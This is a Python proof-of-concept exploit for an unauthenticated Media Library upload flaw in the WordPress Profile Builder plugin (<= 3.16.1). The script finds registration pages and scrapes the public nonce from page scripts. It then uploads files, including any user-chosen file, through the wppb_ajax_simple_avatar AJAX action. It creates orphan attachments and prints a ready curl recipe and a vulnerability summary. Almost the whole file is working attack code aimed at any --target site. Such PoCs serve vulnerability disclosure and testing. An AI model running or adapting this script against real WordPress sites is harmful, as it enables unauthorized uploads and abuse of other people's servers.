#!/usr/bin/env python3
from __future__ import annotations

from datetime import datetime, timezone
import argparse
import base64
import http.cookiejar
import json
import re
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from urllib import error, request
from urllib.parse import urljoin

PROOF_FILENAME = "proof.png"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
VERSION = "1.1.0"

COMMON_REGISTER_PATHS = (
    "/register/",
    "/registration/",
    "/sign-up/",
    "/signup/",
    "/join/",
    "/create-account/",
    "/pb-register-test/",
    "/account/register/",
)


@dataclass
class TargetContext:
    target: str
    page: str
    nonce: str
    field_name: str
    ajax_url: str
    opener: request.OpenerDirector


def build_opener() -> request.OpenerDirector:
    jar = http.cookiejar.CookieJar()
    return request.build_opener(request.HTTPCookieProcessor(jar))


def http_get(opener: request.OpenerDirector, url: str) -> tuple[int, str]:
    req = request.Request(url, headers={"User-Agent": UA})
    try:
        with opener.open(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")


def http_post_multipart(
    opener: request.OpenerDirector,
    url: str,
    fields: list[tuple[str, str]],
    files: list[tuple[str, Path, str]],
) -> tuple[int, str]:
    boundary = "----ProfileBuilderPoC"
    body = bytearray()
    for key, val in fields:
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode())
        body.extend(f"{val}\r\n".encode())
    for field_name, file_path, mime in files:
        body.extend(f"--{boundary}\r\n".encode())
        body.extend(
            f'Content-Disposition: form-data; name="{field_name}"; filename="{file_path.name}"\r\n'.encode()
        )
        body.extend(f"Content-Type: {mime}\r\n\r\n".encode())
        body.extend(file_path.read_bytes())
        body.extend(b"\r\n")
    body.extend(f"--{boundary}--\r\n".encode())

    req = request.Request(
        url,
        data=bytes(body),
        headers={
            "User-Agent": UA,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
        method="POST",
    )
    try:
        with opener.open(req, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace").strip()
    except error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace").strip()


def extract_nonce_and_field(html: str) -> tuple[str, str, str]:
    ajax_url = ""
    m = re.search(r'"ajaxUrl"\s*:\s*"([^"]+)"', html)
    if m:
        ajax_url = m.group(1).replace("\\/", "/")

    m = re.search(
        r'wppb-upload-script-js-extra" src="data:text/javascript;base64,([^"]+)"',
        html,
    )
    if m:
        blob = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
        nonce_m = re.search(r'"nonce"\s*:\s*"([^"]+)"', blob)
        if nonce_m:
            return nonce_m.group(1), _field_from_html(html), ajax_url or "/wp-admin/admin-ajax.php"

    m = re.search(r"wppb_upload_script_vars\s*=\s*(\{.*?\});", html, re.S)
    if m:
        data = json.loads(m.group(1))
        return data["nonce"], _field_from_html(html), data.get("ajaxUrl", "/wp-admin/admin-ajax.php")

    m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{10})"', html)
    if m and "wppb" in html.lower():
        return m.group(1), _field_from_html(html), ajax_url or "/wp-admin/admin-ajax.php"

    raise RuntimeError(
        "Could not find wppb_ajax_simple_upload nonce. "
        "The page must include Profile Builder Avatar field with simple-upload enabled. "
        "Try --discover or pass --nonce and --field manually (from page source)."
    )


def ajax_field_name(html_field: str) -> str:
    return re.sub(r"^(simple_upload_)", "", html_field).replace("-", "_")


def _field_from_html(html: str) -> str:
    m = re.search(r'name="(simple_upload_[^"]+)"', html)
    return m.group(1) if m else "simple_upload_custom_avatar"


def page_has_upload_surface(html: str) -> bool:
    markers = (
        "wppb-upload-script",
        "wppb_upload_script_vars",
        "simple_upload_",
        "wppb_ajax_simple_upload",
    )
    return any(x in html for x in markers)


def discover_register_pages(target: str, opener: request.OpenerDirector) -> list[str]:
    found: list[str] = []
    base = target.rstrip("/")

    api = f"{base}/wp-json/wp/v2/pages?per_page=50&search=register"
    status, body = http_get(opener, api)
    if status == 200:
        try:
            for page in json.loads(body):
                link = page.get("link")
                if link:
                    found.append(link)
        except json.JSONDecodeError:
            pass

    for path in COMMON_REGISTER_PATHS:
        url = base + path
        if url not in found:
            found.append(url)

    viable: list[str] = []
    for url in found:
        status, html = http_get(opener, url)
        if status == 200 and page_has_upload_surface(html):
            viable.append(url)
    return viable


def make_minimal_png(path: Path) -> None:
    path.write_bytes(
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01"
        b"\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
        b"\x00\x00\x00\x0cIDATx\x9cc``\x00\x00\x00\x04\x00\x01"
        b"\x5c\xcd\xff\x6f\x00\x00\x00\x00IEND\xaeB`\x82"
    )


def make_minimal_gif(path: Path) -> None:
    path.write_bytes(
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
        b"\x00\x02\x02D\x01\x00;"
    )


def parse_attachment_id(response: str) -> int | None:
    cleaned = response.strip().strip('"')
    if re.fullmatch(r"[0-9]+", cleaned):
        return int(cleaned)
    if "upload_error" in response or "error" in response.lower():
        return None
    return None


def verify_attachment(opener: request.OpenerDirector, target: str, attachment_id: int) -> dict:
    result: dict = {"attachment_id": attachment_id}
    api = urljoin(target.rstrip("/") + "/", f"wp-json/wp/v2/media/{attachment_id}")
    status, body = http_get(opener, api)
    result["rest_status"] = status
    if status == 200:
        try:
            data = json.loads(body)
            result["source_url"] = data.get("source_url")
            result["mime_type"] = data.get("mime_type")
            result["author"] = data.get("author")
            result["title"] = data.get("title", {}).get("rendered")
        except json.JSONDecodeError:
            result["rest_body"] = body[:500]
    else:
        result["rest_error"] = body[:300]

    if result.get("source_url"):
        fstatus, _ = http_get(opener, result["source_url"])
        result["file_http_status"] = fstatus

    return result


def ajax_upload(ctx: TargetContext, file_path: Path, mime: str) -> tuple[int, str]:
    ajax = ctx.ajax_url
    if not ajax.startswith("http"):
        ajax = urljoin(ctx.target.rstrip("/") + "/", ajax.lstrip("/"))
    return http_post_multipart(
        ctx.opener,
        ajax,
        [
            ("action", "wppb_ajax_simple_avatar"),
            ("nonce", ctx.nonce),
            ("name", ctx.field_name),
        ],
        [(ctx.field_name, file_path, mime)],
    )


def print_curl_recipe(ctx: TargetContext, file_path: Path, mime: str) -> None:
    ajax = ctx.ajax_url
    if not ajax.startswith("http"):
        ajax = urljoin(ctx.target.rstrip("/") + "/", ajax.lstrip("/"))
    print("\n--- curl ---")
    print(f"curl -s -c cookies.txt '{ctx.page}'")
    print(f'curl -s -b cookies.txt -X POST "{ajax}" \\')
    print(f'  -F "action=wppb_ajax_simple_avatar" \\')
    print(f'  -F "nonce={ctx.nonce}" \\')
    print(f'  -F "name={ctx.field_name}" \\')
    print(f'  -F "{ctx.field_name}=@{file_path};type={mime}"')
    print("---\n")


def step_banner(n: int, title: str) -> None:
    print(f"\n{'=' * 60}")
    print(f" STEP {n}: {title}")
    print(f"{'=' * 60}")


def resolve_context(args: argparse.Namespace) -> TargetContext:
    opener = build_opener()
    page = args.page

    if args.discover and not args.page:
        step_banner(0, "Discover pages with Avatar simple-upload")
        pages = discover_register_pages(args.target, opener)
        if not pages:
            raise RuntimeError(
                "No pages with Profile Builder upload script found. "
                "Specify --page manually (public registration URL with Avatar field)."
            )
        page = pages[0]
        print(f"[+] Found {len(pages)} candidate page(s); using: {page}")
        for p in pages:
            print(f"    • {p}")

    if not page:
        raise RuntimeError("Provide --page or use --discover")

    if args.nonce and args.field:
        ajax = args.ajax_url or urljoin(args.target.rstrip("/") + "/", "wp-admin/admin-ajax.php")
        return TargetContext(
            target=args.target.rstrip("/"),
            page=page,
            nonce=args.nonce,
            field_name=ajax_field_name(args.field),
            ajax_url=ajax,
            opener=opener,
        )

    step_banner(1, "Fetch public registration page (unauthenticated, cookie jar enabled)")
    print(f"GET {page}")
    status, html = http_get(opener, page)
    print(f"HTTP {status} | {len(html)} bytes")
    if status != 200:
        raise RuntimeError(f"Page returned HTTP {status}")

    nonce, field, ajax = extract_nonce_and_field(html)
    post_field = ajax_field_name(args.field or field)
    print(f"[+] Public nonce extracted: {nonce}")
    print(f"[+] HTML file input name:   {field}")
    print(f"[+] AJAX POST field name:   {post_field}")
    print(f"[+] AJAX endpoint:          {ajax}")
    print("[+] Session cookies stored for upload request (no login cookie).")

    return TargetContext(
        target=args.target.rstrip("/"),
        page=page,
        nonce=nonce,
        field_name=post_field,
        ajax_url=args.ajax_url or ajax,
        opener=opener,
    )


def expected_upload_url(target: str, filename: str = PROOF_FILENAME) -> str:
    now = datetime.now(timezone.utc)
    base = target.rstrip("/")
    return f"{base}/wp-content/uploads/{now.year:04d}/{now.month:02d}/{filename}"


def check_public_file(opener: request.OpenerDirector, url: str) -> tuple[int, str]:
    status, _ = http_get(opener, url)
    if status == 200:
        return status, "EXISTS — file is publicly reachable"
    if status == 404:
        return status, "NOT FOUND — file does not exist yet"
    return status, f"HTTP {status}"


def demo_basic(ctx: TargetContext, upload_file: Path | None, mime: str) -> int:
    with tempfile.TemporaryDirectory() as tmp:
        if upload_file and upload_file.is_file():
            fpath = upload_file
            mime = mime or "application/octet-stream"
            proof_name = fpath.name
        else:
            fpath = Path(tmp) / PROOF_FILENAME
            make_minimal_png(fpath)
            mime = "image/png"
            proof_name = PROOF_FILENAME

        expected_url = expected_upload_url(ctx.target, proof_name)

        step_banner(2, "Before upload — confirm proof file is NOT on the server")
        print(f"GET {expected_url}")
        pre_status, pre_msg = check_public_file(ctx.opener, expected_url)
        print(f"HTTP {pre_status} — {pre_msg}")

        step_banner(3, "Upload file via wp_ajax_nopriv_wppb_ajax_simple_avatar")
        print(f"Uploading: {fpath.name} ({mime})")
        status, resp = ajax_upload(ctx, fpath, mime)
        print(f"HTTP {status}")
        print(f"Response body: {resp!r}")

        aid = parse_attachment_id(resp)
        if not aid:
            print("\n[-] Upload failed — expected numeric attachment ID.")
            if "nonce" in resp.lower() or "cookie" in resp.lower():
                print("    Hint: nonce may have expired; re-run to fetch a fresh nonce from the page.")
            print_curl_recipe(ctx, fpath, mime)
            return 1

        print(f"\n[+] SUCCESS: Unauthenticated upload → Media Library attachment ID {aid}")

        step_banner(4, "After upload — confirm attachment exists and is publicly retrievable")
        info = verify_attachment(ctx.opener, ctx.target, aid)
        print(json.dumps(info, indent=2))

        source_url = info.get("source_url")
        if source_url:
            post_status, post_msg = check_public_file(ctx.opener, source_url)
            print(f"\nGET {source_url}")
            print(f"HTTP {post_status} — {post_msg}")
            if pre_status == 404 and post_status == 200:
                print("\n[+] Before/after demo: file was absent, now publicly accessible.")
        elif info.get("rest_status") == 200:
            print("\n[+] Attachment confirmed via REST API.")
        else:
            print("\n[*] Attachment ID returned; confirm in wp-admin → Media or REST /wp/v2/media/{id}")

        print_curl_recipe(ctx, fpath, mime)
    return 0


def demo_full(ctx: TargetContext) -> int:
    step_banner(2, "Unauthenticated upload + validation bypass demonstration")
    print(
        "Root cause: wppb_ajax_simple_avatar() never calls wppb_valid_simple_upload().\n"
        "The normal registration POST path does call it (extension + size limits).\n"
    )

    with tempfile.TemporaryDirectory() as tmp:
        png = Path(tmp) / "proof.png"
        make_minimal_png(png)
        status, resp = ajax_upload(ctx, png, "image/png")
        aid = parse_attachment_id(resp)
        print(f"PNG upload → HTTP {status}, response {resp!r}")
        if not aid:
            print("[-] Upload failed.")
            print_curl_recipe(ctx, png, "image/png")
            return 1

        info = verify_attachment(ctx.opener, ctx.target, aid)
        print(f"[+] Attachment ID {aid}")
        print(json.dumps(info, indent=2))

        gif = Path(tmp) / "proof.gif"
        make_minimal_gif(gif)
        _, gresp = ajax_upload(ctx, gif, "image/gif")
        gid = parse_attachment_id(gresp)
        print(f"\n[*] Secondary GIF upload (validation bypass demo): {gresp!r}")
        if gid:
            print(f"[+] GIF also accepted via AJAX → attachment ID {gid}")

        step_banner(3, "Orphaned attachments (no registration completed)")
        orphan_ids = [aid]
        if gid:
            orphan_ids.append(gid)
        for i in range(2):
            p = Path(tmp) / f"orphan_{i}.png"
            make_minimal_png(p)
            _, r = ajax_upload(ctx, p, "image/png")
            oid = parse_attachment_id(r)
            if oid:
                orphan_ids.append(oid)
        print(f"[+] Created {len(orphan_ids)} Media Library attachments without login: {orphan_ids}")
        print("[+] Typically post_author=0 until registration completes.")

        step_banner(4, "Report summary")
        print(
            f"""
Vulnerability : Unauthenticated Media Library upload via admin-ajax.php
Plugin        : Profile Builder <= 3.16.1
Action        : wppb_ajax_simple_avatar (wp_ajax_nopriv_*)
Auth required : None (public nonce from registration page JS only)
CWE           : CWE-862, CWE-434
Severity      : Medium

Proof         : Attachment ID {aid}
File URL      : {info.get('source_url', '(check REST or Media Library)')}
"""
        )
        print_curl_recipe(ctx, png, "image/png")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Profile Builder unauthenticated Media Library upload PoC",
    )
    parser.add_argument("--target", required=True, help="WordPress base URL, e.g. https://example.com")
    parser.add_argument("--page", help="Public registration page URL with Avatar simple-upload")
    parser.add_argument(
        "--discover",
        action="store_true",
        help="Scan common /register paths and WP REST for a page with upload nonce",
    )
    parser.add_argument("--nonce", help="Manual nonce (from page source wppb_upload_script_vars)")
    parser.add_argument("--field", help="Manual field name, e.g. simple_upload_custom_avatar")
    parser.add_argument("--ajax-url", help="Override admin-ajax.php URL")
    parser.add_argument("--demo", choices=("basic", "full"), default="full")
    parser.add_argument("--file", type=Path, help="Custom file to upload")
    parser.add_argument("--mime", default="image/png", help="MIME type with --file")
    args = parser.parse_args()

    if not args.page and not args.discover and not (args.nonce and args.field):
        parser.error("Provide --page, use --discover, or pass --nonce and --field")

    print(f"Profile Builder Unauthenticated Upload PoC v{VERSION}")
    print(f"Target: {args.target}")

    try:
        ctx = resolve_context(args)
        if args.demo == "basic" or args.file:
            return demo_basic(ctx, args.file, args.mime)
        return demo_full(ctx)
    except (RuntimeError, error.URLError, TimeoutError) as exc:
        print(f"\n[-] Error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
